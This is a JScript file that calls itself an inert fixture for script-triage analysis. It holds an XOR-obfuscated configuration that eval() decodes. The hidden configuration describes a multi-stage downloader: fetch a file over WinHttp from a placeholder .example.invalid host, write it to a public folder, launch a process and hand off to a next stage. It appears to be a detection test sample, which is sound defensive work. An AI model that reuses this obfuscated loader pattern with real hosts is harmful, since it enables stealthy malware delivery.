// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_fd71ad15 = function decode_fd71ad15_body(storedMaterial) {
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ 42); }
  return recoveredMaterial;
};
var recover_98cbf70d = function recover_98cbf70d_body() {
  var packedText = "81-8-89-94-79-90-89-8-16-113-8-75-73-91-95-67-88-79-117-88-79-71-69-94-79-8-6-8-93-88-67-94-79-117-76-67-70-79-8-6-8-78-67-89-90-75-94-73-66-117-90-88-69-73-79-89-89-8-6-8-66-75-68-78-69-76-76-117-89-73-88-67-90-94-8-119-6-8-75-78-75-90-94-79-88-8-16-8-125-67-68-98-94-94-90-4-125-67-68-98-94-94-90-120-79-91-95-79-89-94-4-31-4-27-8-6-8-92-75-70-95-79-89-8-16-81-8-73-75-71-90-75-67-77-68-117-67-78-8-16-8-73-75-71-90-75-67-77-68-7-24-18-24-79-79-72-27-79-76-29-8-6-8-95-88-70-8-16-8-66-94-94-90-89-16-5-5-24-18-24-79-79-72-27-79-76-29-4-79-82-75-71-90-70-79-4-67-68-92-75-70-67-78-5-72-19-73-24-24-30-75-19-4-78-75-94-8-6-8-95-89-79-88-117-75-77-79-68-94-8-16-8-98-95-68-94-88-79-89-89-102-75-72-5-24-18-24-79-79-72-27-79-76-29-8-6-8-76-67-70-79-117-90-75-94-66-8-16-8-105-16-118-118-127-89-79-88-89-118-118-122-95-72-70-67-73-118-118-98-95-68-94-88-79-89-89-102-75-72-118-118-89-94-75-77-79-7-24-18-24-79-79-72-27-79-76-29-4-78-75-94-8-6-8-88-79-77-67-89-94-88-83-117-90-75-94-66-8-16-8-98-97-105-127-118-118-121-69-76-94-93-75-88-79-118-118-98-95-68-94-88-79-89-89-102-75-72-118-118-110-67-89-90-69-89-75-72-70-79-118-118-24-18-24-79-79-72-27-79-76-29-8-6-8-68-79-82-94-117-89-94-75-77-79-8-16-8-70-69-73-75-70-7-78-67-89-90-75-94-73-66-4-64-89-8-87-6-8-89-94-75-77-79-105-69-95-68-94-8-16-30-87";

  var packedParts = packedText.split("-");

  var storedMaterial = [];

  for (var di = 0; di < packedParts.length; di++) { storedMaterial.push(parseInt(packedParts[di], 10)); }

  var harmlessValue = "PROCESSOR_ARCHITECTURE";

  var recoveredMaterial = [];

  var state = 1;

  switch (state) { case 1: recoveredMaterial = decode_fd71ad15.apply(null, [storedMaterial]); break; default: recoveredMaterial = []; }

  var configurationText = "";

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { configurationText += String.fromCharCode(recoveredMaterial[bi]); }

  return configurationText;
};
var inspect_18a96c0f = function inspect_18a96c0f_body() {
  var configuration = eval("(" + recover_98cbf70d.apply(null, []) + ")");
  return { steps: configuration["steps"], adapter: configuration["adapter"], values: configuration["values"], stageCount: configuration["stageCount"] };
};
